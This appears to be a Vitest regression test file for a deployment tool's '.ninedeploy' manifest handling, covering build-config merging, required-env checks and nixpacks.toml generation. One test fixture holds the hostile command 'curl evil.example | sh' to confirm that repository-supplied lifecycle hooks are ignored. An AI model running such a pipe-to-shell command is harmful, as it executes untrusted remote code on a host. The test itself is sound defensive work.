/**
 * Regression guard: the `.ninedeploy` manifest actually shapes the build.
 *
 * The manifest schema defines 17 top-level sections and the web Manifest
 * Creator ships an editor for each, but until 0.3.5 only three of them
 * (`routes`, `database`, `alerts`) ever reached a deploy. `build`, `run`,
 * `resources`, `env.required`, `runtime` and `phases` were parsed, validated,
 * covered by tests — and then silently dropped, while
 * `docs/NINEDEPLOY_MANIFEST.md` §6.1 described a `nixpacks.toml` that nothing
 * generated. `lib/ninedeployToNixpacks.ts` and `lib/ninedeployApply.ts` had no
 * importers at all.
 *
 * These tests pin the wiring at the two seams it passes through: the pure merge
 * helpers, and the Docker builder that turns `runtime`/`phases` into a real
 * file on disk.
 */
import { mkdtempSync, readFileSync, rmSync, writeFileSync, existsSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { NinedeployManifest } from '@ninedeploy/schemas';
import { applyManifestToBuildConfig, findMissingRequiredEnv } from '../src/lib/ninedeployApply.js';
import { generateNixpacksToml } from '../src/lib/ninedeployToNixpacks.js';

const execMocks = vi.hoisted(() => ({
  buildEnv: vi.fn(() => ({})),
  capture: vi.fn(async () => 'nixpacks 1.41.0'),
  run: vi.fn(async () => undefined),
  sleep: vi.fn(async () => undefined),
}));
vi.mock('../src/lib/exec.js', () => execMocks);
vi.mock('../src/engine/proxy.js', () => ({ NETWORK: 'ninedeploy' }));
vi.mock('../src/lib/dockerPull.js', () => ({
  ensureDockerImage: vi.fn(async () => undefined),
  pullDockerImage: vi.fn(async () => undefined),
}));
vi.mock('../src/lib/serviceBridge.js', () => ({ ensureServiceBridge: vi.fn(async () => undefined) }));

const dirs: string[] = [];
function repo(): string {
  const dir = mkdtempSync(path.join(tmpdir(), 'nd-manifest-'));
  dirs.push(dir);
  return dir;
}
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
  vi.clearAllMocks();
});

const buildConfigRow = (over: Record<string, unknown> = {}) =>
  ({
    id: 1,
    serviceId: 1,
    buildPack: 'auto',
    baseDir: '/',
    installCmd: null,
    buildCmd: null,
    startCmd: null,
    dockerfilePath: null,
    preDeployCmd: null,
    postDeployCmd: null,
    preStopCmd: null,
    restartPolicy: 'unless-stopped',
    stopGraceSeconds: 5,
    createdAt: new Date(),
    updatedAt: new Date(),
    ...over,
  }) as never;

const manifest = (over: Partial<NinedeployManifest> = {}): NinedeployManifest =>
  ({ version: '1', ...over }) as NinedeployManifest;

describe('applyManifestToBuildConfig — panel > manifest > auto-detect', () => {
  it('fills every build field the panel left empty', () => {
    const merged = applyManifestToBuildConfig(
      manifest({ build: { install: 'npm ci', build: 'npm run build', start: 'npm start', baseDir: 'apps/api' } }),
      buildConfigRow(),
    );
    expect(merged).toMatchObject({
      installCmd: 'npm ci',
      buildCmd: 'npm run build',
      startCmd: 'npm start',
      baseDir: 'apps/api',
    });
  });

  it('never overwrites a value the operator set in the panel', () => {
    const merged = applyManifestToBuildConfig(
      manifest({ build: { install: 'npm ci', baseDir: 'apps/api' } }),
      buildConfigRow({ installCmd: 'pnpm i --frozen-lockfile', baseDir: 'services/web' }),
    );
    expect(merged.installCmd).toBe('pnpm i --frozen-lockfile');
    expect(merged.baseDir).toBe('services/web');
  });

  it("treats the schema default baseDir ('/') as unset", () => {
    // `build_configs.base_dir` is NOT NULL with default '/', so a plain
    // null-check would mean the manifest could never supply it.
    expect(applyManifestToBuildConfig(manifest({ build: { baseDir: 'sub' } }), buildConfigRow({ baseDir: '/' })).baseDir).toBe('sub');
    expect(applyManifestToBuildConfig(manifest({ build: { baseDir: 'sub' } }), buildConfigRow({ baseDir: '' })).baseDir).toBe('sub');
  });

  it('accepts run.restart, which only changes how the container is supervised', () => {
    expect(
      applyManifestToBuildConfig(manifest({ run: { restart: 'on-failure:3' } as never }), buildConfigRow()).restartPolicy,
    ).toBe('on-failure:3');
  });

  it('leaves a restart policy the operator changed away from the default', () => {
    expect(
      applyManifestToBuildConfig(
        manifest({ run: { restart: 'always' } as never }),
        buildConfigRow({ restartPolicy: 'no' }),
      ).restartPolicy,
    ).toBe('no');
  });

  it('never takes lifecycle hooks from the repository', () => {
    // Hooks execute on the HOST. Honouring them from a manifest would hand
    // anyone with push access the capability hostPrivilege.ts gates behind the
    // instance-operator flag.
    const merged = applyManifestToBuildConfig(
      manifest({ hooks: { preBuild: 'curl evil.example | sh' } as never }),
      buildConfigRow(),
    );
    expect(merged.preDeployCmd).toBeNull();
    expect(merged.postDeployCmd).toBeNull();
    expect(merged.preStopCmd).toBeNull();
  });

  it('is a no-op for a manifest with no build section', () => {
    const original = buildConfigRow({ installCmd: 'x' });
    expect(applyManifestToBuildConfig(manifest(), original)).toMatchObject({ installCmd: 'x', buildCmd: null });
  });
});

describe('findMissingRequiredEnv', () => {
  it('reports declared keys that the resolved environment does not carry', () => {
    const m = manifest({ env: { required: ['DATABASE_URL', 'API_KEY'], aliases: undefined } as never });
    expect(findMissingRequiredEnv(m, { DATABASE_URL: 'postgres://x' })).toEqual(['API_KEY']);
  });

  it('counts an empty string as present — set-but-blank is the author’s problem', () => {
    const m = manifest({ env: { required: ['API_KEY'] } as never });
    expect(findMissingRequiredEnv(m, { API_KEY: '' })).toEqual([]);
  });

  it('returns nothing when the manifest declares no requirements', () => {
    expect(findMissingRequiredEnv(manifest(), {})).toEqual([]);
  });
});

describe('generateNixpacksToml', () => {
  it('produces nothing for a manifest with no runtime or phases', () => {
    expect(generateNixpacksToml(manifest()).toml).toBeNull();
  });

  it('emits install/build/start phases from the build section', () => {
    const { toml } = generateNixpacksToml(
      manifest({ build: { install: 'npm ci', build: 'npm run build', start: 'node server.js' } }),
    );
    expect(toml).toContain('[phases.install]');
    expect(toml).toContain('npm ci');
    expect(toml).toContain('[phases.build]');
    expect(toml).toContain('[phases.start]');
    expect(toml).toContain('node server.js');
  });

  it('extends the provider package list rather than replacing it', () => {
    // `nixPkgs` REPLACES the provider's selection unless the list carries the
    // "..." sentinel — without it a single extra package deletes the toolchain.
    const { toml } = generateNixpacksToml(
      manifest({ phases: { setup: { pkgs: ['ffmpeg'] } } as never }),
    );
    expect(toml).toContain('"..."');
    expect(toml).toContain('ffmpeg');
  });
});

describe('the Docker builder writes the generated nixpacks.toml', () => {
  async function buildWith(m: NinedeployManifest | undefined, workDir: string) {
    const { dockerBuilder } = await import('../src/engine/builders/docker.js');
    const service = {
      id: 1,
      slug: 'web',
      name: 'Web',
      type: 'docker',
      status: 'idle',
      image: null,
      port: 3000,
      healthPath: '/',
      volumeMount: null,
      cpuShares: 0,
      memLimitMb: 0,
      runtimeId: null,
      publishedPort: null,
      dockerSocket: false,
      cmd: null,
    };
    await dockerBuilder.buildAndRun({
      deploymentId: 1,
      service: service as never,
      buildConfig: buildConfigRow({ buildPack: 'nixpacks' }),
      workDir,
      commitSha: 'abcdef1234',
      env: {},
      manifest: m,
      log: () => undefined,
    } as never);
  }

  it('generates the file when the manifest carries runtime/phases', async () => {
    const dir = repo();
    await buildWith(manifest({ build: { install: 'npm ci' } }), dir);
    const written = path.join(dir, 'nixpacks.toml');
    expect(existsSync(written)).toBe(true);
    expect(readFileSync(written, 'utf8')).toContain('npm ci');
  });

  it('writes into the manifest baseDir, not the server working directory', async () => {
    // `baseDir` reaching the builder is REPO-relative (it is the nixpacks CLI
    // operand); writing to it unresolved would land the file next to the
    // server process.
    const dir = repo();
    mkdirSync(path.join(dir, 'apps', 'api'), { recursive: true });
    const { dockerBuilder } = await import('../src/engine/builders/docker.js');
    await dockerBuilder.buildAndRun({
      deploymentId: 1,
      service: { id: 1, slug: 'web', type: 'docker', port: 3000, healthPath: '/', cpuShares: 0, memLimitMb: 0 } as never,
      buildConfig: buildConfigRow({ buildPack: 'nixpacks', baseDir: 'apps/api' }),
      workDir: dir,
      commitSha: 'abcdef1234',
      env: {},
      manifest: manifest({ build: { install: 'npm ci' } }),
      log: () => undefined,
    } as never);
    expect(existsSync(path.join(dir, 'apps', 'api', 'nixpacks.toml'))).toBe(true);
    expect(existsSync(path.join(dir, 'nixpacks.toml'))).toBe(false);
  });

  it('keeps a nixpacks.toml the repository already ships', async () => {
    const dir = repo();
    writeFileSync(path.join(dir, 'nixpacks.toml'), '# hand written\n', 'utf8');
    await buildWith(manifest({ build: { install: 'npm ci' } }), dir);
    expect(readFileSync(path.join(dir, 'nixpacks.toml'), 'utf8')).toBe('# hand written\n');
  });

  // r274: the working dir is reused across deploys. The file generated by the
  // first deploy used to be read by the second as "repo already ships a
  // nixpacks.toml — keeping it", so every later manifest change was ignored.
  it('r274: regenerates its own file on the next deploy of the reused working dir', async () => {
    const dir = repo();
    await buildWith(manifest({ build: { install: 'npm ci' } }), dir);
    await buildWith(manifest({ build: { install: 'pnpm install --frozen-lockfile' } }), dir);
    const toml = readFileSync(path.join(dir, 'nixpacks.toml'), 'utf8');
    expect(toml).toContain('pnpm install --frozen-lockfile');
    expect(toml).not.toContain('npm ci');
  });

  it('r274: removes its own stale file once the manifest drops runtime/phases', async () => {
    const dir = repo();
    await buildWith(manifest({ build: { install: 'npm ci' } }), dir);
    await buildWith(undefined, dir);
    expect(existsSync(path.join(dir, 'nixpacks.toml'))).toBe(false);
  });

  it('writes nothing when the service ships no manifest', async () => {
    const dir = repo();
    await buildWith(undefined, dir);
    expect(existsSync(path.join(dir, 'nixpacks.toml'))).toBe(false);
  });
});
